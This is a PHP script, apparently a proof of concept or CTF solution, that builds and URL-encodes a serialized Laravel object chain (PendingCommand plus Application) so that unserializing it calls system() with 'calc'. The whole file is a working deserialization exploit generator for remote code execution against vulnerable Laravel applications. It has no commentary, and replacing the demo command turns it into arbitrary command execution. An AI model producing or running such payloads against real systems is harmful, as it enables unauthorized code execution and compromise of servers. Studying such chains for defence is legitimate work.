<?php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $hasExecuted = false;
        protected $parameters = array("calc");
        protected $command = "system";
        public $test;
        protected $app;
        public function __construct($a, $b)
        {
            $this->test = $a;
            $this->app = $b;
        }
    }
}
namespace Tests\Unit{
    class ExampleTest{
        public $expectedOutput = array("diggid"=>"diggid");
    }
}

namespace Illuminate\Foundation{
    class Application{
        protected $instances;
        public function __construct($a)
        {
            if($a != null) {
                $this->instances = array("Illuminate\Contracts\Console\Kernel" => $a);
            }
        }
    }
}

namespace {
    $d = new Illuminate\Foundation\Application(null);
    $c = new Illuminate\Foundation\Application($d);
    $b = new Tests\Unit\ExampleTest;
    $a = new Illuminate\Foundation\Testing\PendingCommand($b,$c);
    echo urlencode(serialize($a));
}
